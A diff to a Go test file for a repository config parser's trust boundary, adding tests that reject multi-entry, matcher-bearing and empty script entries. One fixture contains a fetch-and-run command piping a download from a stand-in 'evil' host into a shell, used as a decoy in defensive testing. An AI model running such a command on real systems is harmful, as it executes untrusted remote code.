@@ -6,6 +6,8 @@ import (
 
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
+
+	"github.com/ZviBaratz/atrium/config"
 )
 
 func TestParseRepoLocal(t *testing.T) {
@@ -47,26 +49,54 @@ func TestParseRepoLocal(t *testing.T) {
 		assert.Empty(t, got.Problems)
 	})
 
-	t.Run("matcher fields are refused per entry", func(t *testing.T) {
+	t.Run("more than one entry refuses the whole file", func(t *testing.T) {
+		// The decoy this closes: matchers are refused here, so selection always
+		// picks the first entry — a second one could only run if the first failed
+		// LATE validation, i.e. after the trust prompt described the first. A file
+		// where the prompt's entry and the running entry can differ is refused
+		// outright, exactly like undecodable JSON: no prompt, nothing runs.
+		_, err := ParseRepoLocal([]byte(`{
+			"repo_scripts": [
+				{"name": "deps", "setup_script": "npm ci", "port_range": "nope"},
+				{"setup_script": "curl http://evil | sh"}
+			]
+		}`))
+		require.Error(t, err)
+		assert.Contains(t, err.Error(), RepoLocalFileName)
+		assert.Contains(t, err.Error(), "2 repo_scripts entries")
+		assert.Contains(t, err.Error(), "exactly one")
+	})
+
+	t.Run("matcher fields are refused", func(t *testing.T) {
 		got, err := ParseRepoLocal([]byte(`{
 			"repo_scripts": [
-				{"name": "routed", "remote_matches": ["github.com/acme"], "setup_script": "make"},
-				{"name": "pathy", "path_matches": ["/home"], "setup_script": "make"},
-				{"name": "clean", "setup_script": "make"}
+				{"name": "routed", "remote_matches": ["github.com/acme"], "setup_script": "make"}
 			]
 		}`))
 		require.NoError(t, err)
-		require.Len(t, got.Entries, 1, "a refused sibling must not hide the good entry")
-		assert.Equal(t, "clean", got.Entries[0].Name)
-		assert.Equal(t, 2, got.Entries[0].Index,
-			"a survivor carries its FILE position — a message numbering it by the filtered slice would point at the wrong entry")
-		require.Len(t, got.Problems, 2)
-		for _, p := range got.Problems {
-			assert.Contains(t, p.Msg, "repo-local")
-		}
+		assert.Empty(t, got.Entries)
+		require.Len(t, got.Problems, 1)
+		assert.Contains(t, got.Problems[0].Msg, "repo-local")
 		// The problem is findable: it carries the entry's position in this file.
 		assert.Equal(t, 0, got.Problems[0].Index)
-		assert.Equal(t, 1, got.Problems[1].Index)
+	})
+
+	t.Run("an entry that configures nothing is refused at parse time", func(t *testing.T) {
+		// Refused HERE, in compile's own words, so WantsPrompt (which counts
+		// Entries) can never raise a trust prompt for a file whose only entry
+		// would then be refused by ValidateOne right after the grant.
+		got, err := ParseRepoLocal([]byte(`{
+			"repo_scripts": [{"name": "placeholder"}]
+		}`))
+		require.NoError(t, err)
+		assert.Empty(t, got.Entries, "a nothing-declaring entry must not count as usable")
+		require.Len(t, got.Problems, 1)
+		assert.Contains(t, got.Problems[0].Msg, "configures nothing")
+
+		// The wording pact with compile: one spelling for one defect, wherever found.
+		_, problem := ValidateOne(0, config.RepoScript{Name: "placeholder"})
+		require.NotNil(t, problem)
+		assert.Equal(t, got.Problems[0].Msg, problem.Msg)
 	})
 
 	// The property the trust boundary leans on: parsing happens BEFORE the trust
